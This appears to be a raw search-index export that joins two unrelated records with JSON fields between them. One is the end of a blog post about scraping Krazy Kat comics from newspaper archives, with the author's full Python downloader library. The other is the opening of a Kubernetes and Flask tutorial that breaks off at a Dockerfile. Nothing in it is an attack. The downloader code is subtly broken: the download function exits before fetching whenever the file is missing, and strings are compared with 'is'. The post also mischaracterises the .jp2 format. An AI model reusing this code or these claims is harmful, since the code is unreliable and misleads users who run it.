~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-05-14-ed-1-seq-49.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-04-16-ed-1-seq-50.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-03-05-ed-1-seq-50.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-02-12-ed-1-seq-29.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-01-29-ed-1-seq-27.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1917-04-01-page-38-item-83144.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-06-04-page-49-item-81637.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-06-11-page-47-item-81884.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-07-02-page-32-item-85927.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-10-15-page-40-item-93726.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-10-29-page-44-item-94073.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1917-02-11-page-31-item-89081.jpeg ... With a list of thumbnails to download, I used some code similar to the code below to take in a list of thumbnails and, using their names, determine the URL for the full size image and then download the full sized image: import fileinput import krazy finder = krazy.Finder() finder.add(krazy.LocGov) # finder.add(NewspapersCom) finder.add(krazy.ChipublibOrg) for line in fileinput.input(): print(line) img = finder.identify(line) if not img: continue if img.source_id is 'newspapers.com': img.headers = newspapers_headers img.cookies = newspapers_cookies # print(img.full_size) finder.download(img) This code looks simple because most of the logic is hidden in the krazy Python library that I wrote to abstract out the details. Figuring out dates for comics Once I had several hundred comics on my computer, my next task was to start collecting them together. In the early days of Krazy Kat, the dates on which comics were published was very erratic. I considered several approaches to identifying each comic: made up names, names that have to do with the contents of the comic, \"perceptual hashing\", and so on. Eventually I just decided to use the dates that Fantagraphics used in their books. Overall, this approach worked quite well. With one exception! One of the comics that I found, published on 1922-01-29, was not in any of the Fantagraphics books I looked in! I'm not sure why this is the case, but I suspect that the archive from which Fantagraphics used somehow didn't have this comic? I hope that someone will figure out the reason why I couldn't find the comic and let me know! Finding comics in other online archives Whew! At this point, I had a lot of Krazy Kat comics, but I still had a sneaking suspicion that I had somehow missed some Krazy Kat comics that were already online. Well, it turns out that my suspicions were well founded, because I found comics in three other sources: Wikipedia, which hosts quite a few comics in the Wikimedia Commons The Comic Strip Library, which has scans from books Heritage Auctions, which has high resolution scans of original Krazy Kat artwork From what I could tell, the Wikimedia Commons only had comics which were available elsewhere, so I skipped those. That said, I did put an effort into getting images from The Comic Strip Library and Heritage Auctions and included those images in the comic viewer on this site. I enjoy finding days where the same comic is available from several sources, since it's interesting to see how the comic changes when printed in different ways. Suggestions for future work I gave myself a month to complete this project, so I didn't investigate many of the interesting side-paths that appeared as I explored the world of comics in newspapers archives. Since you, dear reader, have made it this far through this page, then I'm assuming that you're interested enough in the work I did to maybe build upon it? If you are indeed interested in working on a project in this space, here is a list of things I would have liked to have done, but didn't have time to do: Things I wish I could have done Train an image classifier to recognize the comic boundaries I included the full newspaper scans on this site because I didn't want to crop all of those images by hand, and also because that's a job that a good image classifier could do automatically? Train an image classifier that can find all types of comics I was only interested in Krazy Kat comics that were published on Sunday. In the process of manually looking through the archives, I ran across many other interesting comics that I would have liked to have extracted too. The Katzenjammer Kids and Winsor McCay's comics in particular. Train an image classifier that can find the daily Krazy Kat comics From what I can tell, most of the daily Krazy Kat comics haven't been published. Doing this would allow the world to see thousands of new Krazy Kat comics. Investigate approaches to automatically restore comics Given that we have scans of original artwork available, as well as the ability to pull the same comic from several archives, doing automatic comic restoration seems like an approach that's worth investigating. Here are some of the approaches that I would have liked to have looked into myself: Write code to detect and correct stippling When you compare an original Krazy Kat print with what was published in a newspaper, you can see that George Herriman scribbled in areas where he wanted the newspapers to insert stippling. In the published comics, you can see that the scans of the comics have stippling that has been smudged or distorted. It should be possible to train a machine learning model to recognize stippling and correct any errant stipples that it finds. Try and build a Machine Learning model that could synthesize original sketches Given how many original prints are available online, it might be possible to use Machine Learning to \"dream up\" what the original drawing for a comic might have looked like. If this approach worked, it would mean that we could have much higher quality prints of comics. Color and contrast correction All of the scans have different contrast levels, all of them have different shades of white. It would have been nice to automatically correct contrast and color on the scans. Build a Krazy Kat API I would have liked to have made an API like The Star Wars API or the PokeAPI for Krazy Kat. I would have liked this API to have a list of all known comics, links to newspaper archives that held those comics, a list of who shows up in each comic, the text to the comics, and so on Make the image viewer a SPA It would have been cool to make the comic viewer a \"Single Page App\" that used a Krazy Kat API Figure out why the dates that Krazy Kat comics were published on are so erratic It would have been nice to have done some more in-depth analysis into why various newspapers published Krazy Kat comics on different dates. Make Krazy Kat comics in the public domain available in other formats If I had a way to automatically correct the color and contrast in comics, as well as have them automatically cropped, I would have also liked to have converted the comics to other formats, for example: Comic book archive PDF Kindle Recommendations for newspaper archivists If you work for a newspaper archive, here is my wish list for what I would have loved to have had in some or all of the newspaper archives I worked with: An easy way to search for specific days of the week (Sunday in particular) A clearer way to get thumbnails for pages. In particular, I would have loved to be able to download an entire collection of thumbnails at once. Use .jp2 It's JPEG with metadata. Why isn't everybody using this? Make better quality thumbnails If the quality of a thumbnail image is high enough, you don't need to fetch any additional images. For what it's worth, of all the thumbnails that I saw, those from the Chicago Public Library's archive of the Chicago Examiner were the best. Advice for building upon my work If you're inspired by this work and want to build upon it, here is my high level advice: I kept a log with more detailed notes on what I did. Email me and I'll send it to you! Try not to piss off archivists, use caching and thumbnails! Use file tagging to make your life easier I'm happy to share the training data I used with you, just ask! Thanks This project would have been a lot more difficult without the help from the following people and institutions: Tyler Neylon at Unbox Research for the inspiration Tanner Gilligan for advice on the feasibility of using thumbnails as well as advice on how many thumbnails I'd likely need to train a classifier. Timothy Fitz for the idea to use Google AutoML Vision Classification (which inspired me to try that approach and use Microsoft's Custom Vision product instead) The team behind Microsoft's Custom Vision product for building a great tool! Kenneth Reitz for Requests Fantagraphics for their amazing Krazy Kat books The Chicago Public Library Digital Collections the Chronicling America archive from the Library of Congress, and newspapers.com. Full code listing Below is the full code listing for the code in krazy.py: from collections import OrderedDict import datetime import itertools import os import shutil import sys import requests from requests import Request from requests import Session newspapers_dates = {'80665811': '1922-01-08', '80689957': '1922-04-02', '80709570': '1922-07-02', '80725318': '1922-10-29', '80727456': '1922-12-31', '80726753': '1922-12-10', '80726259': '1922-11-26', '79961860': '1921-12-18', '79953764': '1921-12-04', '80670129': '1922-01-22', '79907475': '1921-10-02', '80705478': '1922-06-11', '80688098': '1922-03-26', '80673928': '1922-02-05', '80719993': '1922-09-24', '80721727': '1922-10-01', '80672004': '1922-01-29', '80664354': '1922-01-01', '80716571': '1922-08-27', '80701622': '1922-05-21', '80667982': '1922-01-15', '87593725': '1922-05-07', '79894942': '1921-09-04', '80704313': '1922-06-04', '80694291': '1922-04-16', '80685564': '1922-03-19', '80675323': '1922-02-12', '80725764': '1922-11-12', '80726016': '1922-11-19', '87594108': '1921-10-09', '80703107': '1922-05-28', '80700357': '1922-05-14', '79920320': '1921-10-23', '79926556': '1921-10-30', '80722923': '1922-10-08', '80713478': '1922-07-23', '80726503': '1922-12-03', '79890293': '1921-08-28', '79936055': '1921-11-13', '79957306': '1921-12-11', '79965938': '1921-12-25', '80724021': '1922-10-15', '80679279': '1922-02-26', '80677355': '1922-02-19', '79931806': '1921-11-06', '457887501': '1918-02-17', '457410714': '1918-10-13', '457486179': '1918-10-27', '457772423': '1917-11-25', '458059568': '1918-09-15', '458050238': '1918-12-29', '458077200': '1919-03-23', '457466753': '1917-07-29', '457770405': '1922-02-12', '458016697': '1919-08-03', '458038653': '1919-08-10', '458059136': '1919-08-17', '458077492': '1919-08-24', '458028215': '1919-09-07', '458041825': '1919-09-14', '458078329': '1919-09-28', '459426476': '1919-10-05', '459431409': '1919-10-12', '459439720': '1919-10-19', '459459432': '1919-10-26', '457500046': '1919-11-02', '457538069': '1919-11-09', '457568326': '1919-11-16', '457798935': '1922-05-07', '458112864': '1919-07-20', '457997191': '1919-06-29', '457981504': '1919-06-22', '457965904': '1919-06-15', '457949266': '1919-06-08', '457744406': '1919-05-25', '457713998': '1919-05-18', '457674936': '1919-05-11', '457638508': '1919-05-04', '458042002': '1919-04-27', '458017299': '1919-04-20', '458002234': '1919-04-13', '458088822': '1919-03-30', '458036405': '1919-03-02', '457826061': '1919-02-23', '457807708': '1919-02-16', '457783911': '1919-02-09', '457756906': '1919-02-02', '457734895': '1919-01-26', '457716429': '1919-01-19', '457689797': '1919-01-12', '458026097': '1918-12-22', '458005517': '1918-12-15', '457988045': '1918-12-08', '457972362': '1918-12-01', '457457766': '1918-11-24', '457432240': '1918-11-17', '458033338': '1918-09-01', '457456172': '1918-08-25', '459474336': '1918-07-28', '457842118': '1918-01-20', '457535192': '1917-12-30', '457479729': '1917-12-16', '457444762': '1917-12-09', '457412844': '1917-12-02', '457744171': '1917-11-18', '457716428': '1917-11-11', '457690452': '1917-11-04', '457999366': '1917-10-28', '457991489': '1917-10-21', '457982762': '1917-10-14', '457968714': '1917-10-07', '457789970': '1917-09-30', '457733519': '1917-09-16', '457691222': '1917-09-02', '457634671': '1917-08-19', '457611018': '1917-08-12', '457750102': '1920-02-22', '458018980': '1918-06-02', '458033403': '1918-06-09', '458069378': '1918-06-30', '457927118': '1919-06-01', '457397341': '1918-08-11', '457374766': '1918-08-04', '457402773': '1918-11-10', '458101599': '1919-07-13', '457652116': '1920-02-01', '457591813': '1920-03-07', '457707791': '1920-04-04', '458071940': '1918-09-22', '457374825': '1918-11-03', '458045487': '1918-09-08', '457419977': '1918-08-18', '457716141': '1918-07-14', '457756843': '1918-07-21', '457686530': '1918-07-07', '458055618': '1918-06-16', '458062639': '1918-06-23', '457913412': '1918-05-26', '457888648': '1918-05-19', '457865553': '1918-05-12', '457679991': '1918-04-28', '457847884': '1918-05-05', '457648693': '1918-04-21', '457614524': '1918-04-14', '457583278': '1918-04-07', '459521355': '1918-03-31', '459501540': '1918-03-24', '459478635': '1918-03-17', '459443573': '1918-03-03', '459458580': '1918-03-10', '457909624': '1918-02-24', '457864292': '1918-02-10', '457848649': '1918-01-27', '457830075': '1918-01-13', '457761784': '1917-09-23', '457668918': '1917-08-26'} comics_ha_dates = {'811-5025': '1910-00-00', '7013-93220': '1916-07-29', '7030-92126': '1916-08-06', '17074-16040': '1916-08-20', '18064-14821': '1916-08-20', '7087-92096': '1916-09-10', '18065-15773': '1917-00-00', '7158-92123': '1917-00-00', '817-5488': '1917-00-00', '7192-91012': '1917-03-25', '7079-92139': '1917-07-17', '18073-13574': '1917-07-29', '7023-93116': '1917-08-12', '828-42093': '1917-11-18', '826-43281': '1917-12-16', '815-3311': '1918-00-00', '829-41419': '1918-02-24', '7209-93108': '1918-03-03', '18071-11607': '1918-03-31', '802-6533': '1918-05-05', '18041-11763': '1918-05-19', '7066-92040': '1918-06-23', '18104-14546': '1918-07-21', '7017-94086': '1918-07-21', '18012-12649': '1918-08-11', '18072-12536': '1918-09-15', '828-42094': '1918-10-13', '17124-16682': '1918-10-20', '7104-91138': '1918-10-27', '7066-93239': '1918-11-10', '7177-92090': '1918-12-22', '826-43285': '1919-00-00', '7204-91025': '1919-01-26', '17113-17707': '1919-02-02', '17112-16758': '1919-03-09', '17123-17745': '1919-07-29', '7158-92201': '1919-08-10', '7209-93109': '1919-08-17', '17114-16855': '1919-10-19', '827-43303': '1919-10-26', '7093-92081': '1919-11-23', '17125-17685': '1919-12-21', '7066-92041': '1920-00-00', '825-41055': '1920-00-00', '826-43284': '1920-00-00', '17121-17588': '1920-02-01', '7137-92011': '1920-02-08', '18033-73672': '1920-02-22', '7189-92080': '1920-02-29', '7017-94087': '1920-03-28', '7136-92230': '1920-03-28', '7084-92159': '1920-05-02', '825-41056': '1920-06-20', '17122-16874': '1920-09-16', '7163-93102': '1920-11-07', '18032-72747': '1920-11-21', '7189-92081': '1920-11-28', '7166-92007': '1920-12-26', '17061-17710': '1921-01-30', '827-43304': '1921-03-06', '829-41420': '1921-03-20', '826-43282': '1921-03-27', '17093-16037': '1921-06-04', '18034-74684': '1921-10-30', '821-44248': '1921-11-06', '823-42313': '1921-11-20', '7054-92116': '1922-04-02', '826-43283': '1922-04-23', '7192-91013': '1922-04-30', '7141-93110': '1922-06-11', '7036-92119': '1922-06-25', '7076-92176': '1922-06-25', '18035-75757': '1922-07-09', '7163-93103': '1922-10-01', '823-42314': '1922-10-08', '825-41057': '1922-10-15', '7137-92012': '1922-11-19', '7204-91026': '1923-01-21', '7152-92103': '1926-05-02', '825-41058': '1928-10-28', '811-5026': '1931-12-27', '7104-91139': '1932-04-03', '7104-91140': '1932-07-31', '7084-92160': '1932-08-28', '7141-93111': '1932-10-16', '821-44249': '1932-12-25', '7079-92141': '1933-05-28', '7152-92104': '1933-05-28', '7013-93221': '1934-03-25', '810-1062': '1934-03-25', '7177-92006': '1934-05-27', '7104-91141': '1934-11-11', '7187-93125': '1935-11-03', '821-44247': '1935-11-10', '822-45259': '1936-00-00', '822-45258': '1936-01-19', '7158-92202': '1937-10-10', '7059-92175': '1937-12-12', '824-44179': '1938-02-06', '7023-93117': '1938-09-25', '7066-93238': '1940-02-11', '7189-92082': '1940-03-17', '7084-92161': '1941-05-04', '7139-92093': '1941-11-02', '7177-92091': '1942-05-03', '7036-92120': '1942-05-31', '7021-92108': '1942-08-30', '802-6535': '1942-12-06', '7099-92032': '1943-10-03', '814-6044': '1943-10-31', '7023-93119': '1944-06-25'} class Source: sep = '-' file_suffix = '.jpg' date = None from_page = None def __init__(self, filename=None, session=None): self._parts = [] if session: # print('Setting session to: {}'.format(session)) self.session = session if filename: # Remove the file extension name = os.path.splitext(filename)[0] # self._parts = name.split(self.sep)[4:] self._parts = name.split(self.sep) @property def id(self): return(self.sep.join([self.source_id, self.identifier])) @property def identifier(self): rv = None if self._parts: rv = self.sep.join(self._parts) return(rv) @property def suggested_name(self): return(self.identifier + self.file_suffix) @property def full_size(self): return None @property def thumbnail(self): return None def request(self): url = self.full_size return(Request('GET', url).prepare()) def __repr__(self): return('<{} {}>'.format(self.__class__.__name__, self.identifier)) class LocGov(Source): source_id = 'chroniclingamerica.loc.gov' file_suffix = '.jp2' _base_url = 'http://' + source_id from_page_template = _base_url + '/lccn/{lccn}/{date}/ed-{ed}/seq-{seq}' _search_url = _base_url + '/search/pages/results/' url_template = from_page_template + file_suffix def sunday_pages(self): search_payload = { 'date1': '1913', 'date2': '1944', 'proxdistance': '5', 'proxtext': 'krazy+herriman', 'sort': 'relevance', 'format': 'json' } results_seen = 0 page = 1 urls = [] while True: search_payload['page'] = str(page) # print('Fetching page {}'.format(page)) result = self.session.get(self._search_url, params=search_payload).json() for item in result['items']: results_seen += 1 url = item['url'] if url: yield self._bootstrap_from_url(item['url']) if(results_seen < result['totalItems']): page += 1 else: # print('Found {} items'.format(results_seen)) break @property def date(self): return('-'.join(self._parts[2:6])) @property def _named_parts(self): return({'lccn': self._parts[2], 'date': self.date, 'ed': self._parts[7], 'seq': self._parts[9]}) @property def full_size(self): return(self.url_template.format(**self._named_parts)) @property def from_page(self): return(self.from_page_template.format(**self._named_parts)) @property def thumbnail(self): url = self.from_page + '/image_92x120_from_0,0_to_5698,6998.jpg' return(url) def _bootstrap_from_url(self, url): # http://chroniclingamerica.loc.gov/lccn/sn84026749/1922-04-16/ed-1/seq-50.json url = url.replace('.json', '') self._parts = url.replace('-', '/').split('/')[2:] return self class NewspapersCom(Source): source_id = 'newspapers.com' url_template = 'https://www.newspapers.com/download/image/?type=jpg&id={id}' @property def _sundays(self): start_day = '1916-04-23' end_year = 1924 date = datetime.datetime.strptime(start_day, '%Y-%m-%d') sundays = [] while date.year < end_year: if date.strftime('%A') == 'Sunday': yield date date += datetime.timedelta(days=7) def sunday_pages(self): urls = [ 'http://www.newspapers.com/api/browse/1/US/California/San%20Francisco/The%20San%20Francisco%20Examiner_9317', 'http://www.newspapers.com/api/browse/1/US/District%20of%20Columbia/Washington/The%20Washington%20Times_1607' ] for url in urls: for day in self._sundays: day_path = day.strftime('/%Y/%m/%d') rv = self.session.get(url + day_path).json() if 'children' not in rv: continue for page in rv['children']: self._parts = [ self.source_id, day.strftime('%Y'), day.strftime('%m'), day.strftime('%d'), 'id', page['name'] ] yield self @property def img_id(self): return(self._parts[-1]) @property def date(self): if self.img_id in newspapers_dates: return(newspapers_dates[self.img_id]) return(None) @property def from_page(self): from_url_template = 'https://www.newspapers.com/image/{}/' return(from_url_template.format(self.img_id)) @property def full_size(self): values = { 'id': self.img_id } return(self.url_template.format(**values)) def request(self): # https://2.python-requests.org//en/latest/user/quickstart/#redirection-and-history # \"By default Requests will perform location redirection for all verbs except HEAD.\" url = self.full_size return(Request('GET', url, headers=self.headers, cookies=self.cookies).prepare()) @property def thumbnail(self): return('http://img.newspapers.com/img/thumbnail/{}/90/90.jpg'.format(self.img_id)) class ChipublibOrg(Source): source_id = 'digital.chipublib.org' _base_url = 'http://' + source_id _full_size_url = _base_url + '/digital/download/collection/examiner/id/{id}/size/full' _thumbnail_url = _base_url + '/digital/api/singleitem/collection/examiner/id/{id}/thumbnail' _info_url = _base_url + '/digital/api/collections/{collection}/items/{id}/false' url_template = _full_size_url _chipublib_defaults = [ ('collection', 'examiner'), ('order', 'date'), ('ad', 'dec'), ('page', '1'), ('maxRecords', '100'), ] def _url(self, **inputs): options = OrderedDict(self._chipublib_defaults) for key in inputs: if key in options: value = inputs[key] if isinstance(value, int): value = str(value) options[key] = value path = '/'.join(itertools.chain.from_iterable(options.items())) search_url = 'http://{source_id}/digital/api/search/{path}'.format(source_id=self.source_id, path=path) return search_url def _bootstrap_from_id(self, item_id): defaults = dict(self._chipublib_defaults) values = {'id': item_id, 'collection': defaults['collection']} url = self._info_url.format(**values) # print('url: ' + url) result = self.session.get(url).json() fields = dict([(field['key'], field['value']) for field in result['fields']]) for child in result['parent']['children']: page_number = child['title'].split(' ')[1] # digital.chipublib.org-examiner-1917-12-16-page-34-item-88543 self._parts = [self.source_id, defaults['collection']] self._parts.extend(fields['date'].split(self.sep)) self._parts.extend(['page', str(page_number), 'item', str(child['id'])]) yield self def sunday_pages(self): resultsSeen = 0 page = 1 while True: result = self.session.get(self._url(page=page)).json() for record in result['items']: resultsSeen += 1 metadata = dict([(item['field'], item['value']) for item in record['metadataFields']]) record_date = datetime.datetime.strptime(metadata['date'], '%Y-%m-%d') # Krazy Kat ... a comic strip by cartoonist George Herriman, ... ran from 1913 to 1944. if record_date.year < 1913: continue if record_date.strftime('%A') != 'Sunday': continue item_id = record['itemId'] for page in self._bootstrap_from_id(item_id): yield page if(resultsSeen < result['totalResults']): page += 1 else: break @property def full_size(self): values = { 'id': self._parts[-1] } return(self._full_size_url.format(**values)) @property def thumbnail(self): values = { 'id': self._parts[-1] } return(self._thumbnail_url.format(**values)) @property def date(self): # digital.chipublib.org-examiner-1917-08-19-page-38-item-85416 return('-'.join(self._parts[2:5])) @property def from_page(self): from_page_template = 'http://digital.chipublib.org/digital/collection/examiner/id/{}' return(from_page_template.format(self._parts[-1])) # class WikipediaOrg(Source): # # https://commons.wikimedia.org/wiki/File:Krazy_Kat_1922-06-25_hand-colored.jpg # url_template = 'https://commons.wikimedia.org/wiki/File:{id}' class ComicsHaCom(Source): source_id = 'comics.ha.com' from_url_template = 'https://comics.ha.com/itm/a/{}.s' @property def date(self): if self.identifier in comics_ha_dates: return(comics_ha_dates[self.identifier]) return(None) @property def from_page(self): cid = '{}-{}'.format(self._parts[-2], self._parts[-1]) return(self.from_url_template.format(cid)) class ComicstriplibraryOrg(Source): source_id = 'www.comicstriplibrary.org' @property def date(self): date = { 'year': self.identifier[0:4], 'month': self.identifier[4:6], 'day': self.identifier[6:8], } return('{year}-{month}-{day}'.format(**date)) @property def full_size(self): template = 'https://www.comicstriplibrary.org/images/comics/krazy-kat/krazy-kat-{}.png' return template.format(self.identifier) class Finder: def __init__(self, download_to='images', proxies=None): self.sources = {} self.session = Session() if proxies: # print('Configuring proxies: {}'.format(proxies)) self.session.proxies = proxies self.download_to = download_to if not os.path.exists(download_to): os.mkdir(download_to) def add(self, source): self.sources[source.source_id] = source def sunday_pages(self): for source_id in self.sources: source = self.sources[source_id](session=self.session) # print('From: {}'.format(source)) for url in source.sunday_pages(): yield url def identify(self, line): line = line.rstrip() filename = os.path.basename(line) source = filename.split('-')[3] if source in self.sources: return self.sources[source](filename) else: print('Unknown source: {}'.format(source)) def download(self, img): filename = os.path.join(self.download_to, img.suggested_name) if not os.path.isfile(filename): print('Downloading: {}'.format(filename)) return(False) prepared_request = img.request() # https://stackoverflow.com/a/16696317 with self.session.send(prepared_request, stream=True) as r: r.raise_for_status() with open(filename, 'wb') as f: for chunk in r.iter_content(chunk_size=8192): if chunk: # filter out keep-alive new chunks f.write(chunk) ",
        "_version_": 1718527413060632577
      },
      {
        "story_id": [21021184],
        "story_author": ["feross"],
        "story_descendants": [147],
        "story_score": [540],
        "story_time": ["2019-09-19T22:04:14Z"],
        "story_title": "A Gentle introduction to Kubernetes with more than just the basics",
        "search": [
          "A Gentle introduction to Kubernetes with more than just the basics",
          "https://github.com/eon01/kubernetes-workshop",
          "Slides available here. Original article posted here. Source code here. Inspired from my course: Learn Kubernetes by building 10 projects Introduction In this workshop, we're going to: Deploy Kubernetes services and an Ambassador API gateway. Examine the difference between Kubernetes proxies and service mesh like Istio. Access the Kubernetes API from the outside and from a Pod. Understand what API to choose. See how Service Accounts and RBAC works Discover some security pitfalls when building Docker images and many interesting things. Other things :-) We will start by developing then deploying a simple Python application (a Flask API that returns the list of trending repositories by programming language). Development Environment We are going to use Python 3.6.7 We are using Ubuntu 18.04 that comes with Python 3.6 by default. You should be able to invoke it with the command python3. (Ubuntu 17.10 and above also come with Python 3.6.7) If you use Ubuntu 16.10 and 17.04, you should be able to install it with the following commands: sudo apt-get update sudo apt-get install python3.6 If you are using Ubuntu 14.04 or 16.04, you need to get Python 3 from a Personal Package Archive (PPA): sudo add-apt-repository ppa:deadsnakes/ppa sudo apt-get update sudo apt-get install python3.6 For the other operating systems, visit this guide, follow the instructions and install Python3. Now install PIP, the package manager: sudo apt-get install python3-pip Follow this by the installation of Virtualenvwrapper, which is a virtual environment manager: sudo pip3 install virtualenvwrapper Create a folder for your virtualenvs (I use ~/dev/PYTHON_ENVS) and set it as WORKON_HOME: mkdir ~/dev/PYTHON_ENVS export WORKON_HOME=~/dev/PYTHON_ENVS In order to source the environment details when the user login, add the following lines to ~/.bashrc: source \"/usr/local/bin/virtualenvwrapper.sh\" export WORKON_HOME=\"~/dev/PYTHON_ENVS\" Make sure to adapt the WORKON_HOME to your real WORKON_HOME. Now we need to create then activate the new environment: mkvirtualenv --python=/usr/bin/python3 trendinggitrepositories workon trendinggitrepositories Let's create the application directories: mkdir trendinggitrepositories cd trendinggitrepositories mkdir api cd api Once the virtual environment is activated, we can install Flask: Developing a Trending Git Repositories API (Flask) Inside the API folder api, create a file called app.py and add the following code: from flask import Flask app = Flask(__name__) @app.route('/') def index(): return \"Hello, World!\" if __name__ == '__main__': app.run(debug=True) This will return a hello world message when a user requests the \"/\" route. Now run it using: python app.py and you will see a similar output to the following one: * Serving Flask app \"api\" (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: on * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger PIN: 465-052-587 We now need to install PyGithub since we need it to communicate with Github API v3. Go to Github and create a new app. We will need the application \"Client ID\" and \"Client Secret\": from github import Github g = Github(\"xxxxxxxxxxxxx\", \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\") This is how the mini API looks like: from flask import Flask, jsonify, abort import urllib.request, json from flask import request app = Flask(__name__) from github import Github g = Github(\"xxxxxx\", \"xxxxxxxxxxxxx\") @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) except (ValueError, LookupError) as e: abort(jsonify(error=\"No integer provided for argument 'n' in the URL\")) repositories = g.search_repositories(query='language:python')[:n] for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({'repos':r }) if __name__ == '__main__': app.run(debug=True) Let's hide the Github token and secret as well as other variables in the environment. from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) except (ValueError, LookupError) as e: abort(jsonify(error=\"No integer provided for argument 'n' in the URL\")) repositories = g.search_repositories(query='language:python')[:n] for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({'repos':r }) if __name__ == '__main__': app.run(debug=DEBUG) The code above will return the top \"n\" repositories using Python as a programming language. We can use other languages too: from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) l = args['l'] except (ValueError, LookupError) as e: abort(jsonify(error=\"Please provide 'n' and 'l' parameters\")) repositories = g.search_repositories(query='language:' + l)[:n] try: for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({ 'repos':r, 'status': 'ok' }) except IndexError as e: return jsonify({ 'repos':r, 'status': 'ko' }) if __name__ == '__main__': app.run(debug=DEBUG) In a .env file, add the variables you want to use: CLIENT_ID=\"xxxxx\" CLIENT_SECRET=\"xxxxxx\" ENV=\"dev\" DEBUG=\"True\" Before running the Flask application, you need to source these variables: Now, you can go to http://0.0.0.0:5000/?n=1&l=python to get the trendiest Python repository or http://0.0.0.0:5000/?n=1&l=c for C programming language. Here is a list of other programming languages you can test your code with: C++ Assembly Objective Makefile Shell Perl Python Roff Yacc Lex Awk UnrealScript Gherkin M4 Clojure XS Perl sed The list is long, but our mini API is working fine. Now, let's freeze the dependencies: pip freeze > requirements.txt Before running the API on Kubernetes, let's create a Dockerfile. This is a typical Dockerfile for a Python app: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . /app EXPOSE 5000 CMD [ \"python\", \"app.py\" ] Now you can build it: docker build --no-cache -t tgr . Then run it: docker rm -f tgr docker run -it --name tgr -p 5000:5000 -e CLIENT_ID=\"xxxxxxx\" -e CLIENT_SECRET=\"xxxxxxxxxxxxxxx\" -e DEBUG=\"True\" tgr Let's include some other variables as environment variables: from flask import Flask, jsonify, abort, request import urllib.request, json, os from github import Github app = Flask(__name__) CLIENT_ID = os.environ['CLIENT_ID'] CLIENT_SECRET = os.environ['CLIENT_SECRET'] DEBUG = os.environ['DEBUG'] HOST = os.environ['HOST'] PORT = os.environ['PORT'] g = Github(CLIENT_ID, CLIENT_SECRET) @app.route('/') def get_repos(): r = [] try: args = request.args n = int(args['n']) l = args['l'] except (ValueError, LookupError) as e: abort(jsonify(error=\"Please provide 'n' and 'l' parameters\")) repositories = g.search_repositories(query='language:' + l)[:n] try: for repo in repositories: with urllib.request.urlopen(repo.url) as url: data = json.loads(url.read().decode()) r.append(data) return jsonify({ 'repos':r, 'status': 'ok' }) except IndexError as e: return jsonify({ 'repos':r, 'status': 'ko' }) if __name__ == '__main__': app.run(debug=DEBUG, host=HOST, port=PORT) For security reasons, let's change the user inside the container from root to a user with less rights that we create: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN adduser pyuser RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . . RUN chmod +x app.py RUN chown -R pyuser:pyuser /app USER pyuser EXPOSE 5000 CMD [\"python\",\"./app.py\"] Now if we want to run the container, we need to add many environment variables to the docker run command. An easier solution is using --env-file with Docker run: docker run -it --env-file .env my_container Our .env file looks like the following one: CLIENT_ID=\"xxxx\" CLIENT_SECRET=\"xxxx\" ENV=\"dev\" DEBUG=\"True\" HOST=\"0.0.0.0\" PORT=5000 After this modification, rebuild the image docker build -t tgr . and run it using: docker rm -f tgr; docker run -it --name tgr -p 5000:5000 --env-file .env tgr Our application runs using python app.py which is the webserver that ships with Flask and it's great for development and local execution of your program, however, it's not designed to run in a production mode, whether it's a monolithic app or a microservice. A production server typically receives abuse from spammers, script kiddies, and should be able to handle high traffic. In our case, a good solution is using a WSGI HTTP server like Gunicorn (or uWsgi). First, let's install gunicorn with the following command: pip install gunicorn. This will require us to update our requirements.txt with pip freeze > requirements.txt This is why we are going to change our Docker file: FROM python:3 ENV PYTHONUNBUFFERED 1 RUN adduser pyuser RUN mkdir /app WORKDIR /app COPY requirements.txt /app RUN pip install --upgrade pip RUN pip install -r requirements.txt COPY . . RUN chmod +x app.py RUN chown -R pyuser:pyuser /app USER pyuser EXPOSE 5000 CMD [\"gunicorn\", \"app:app\", \"-b\", \"0.0.0.0:5000\"] 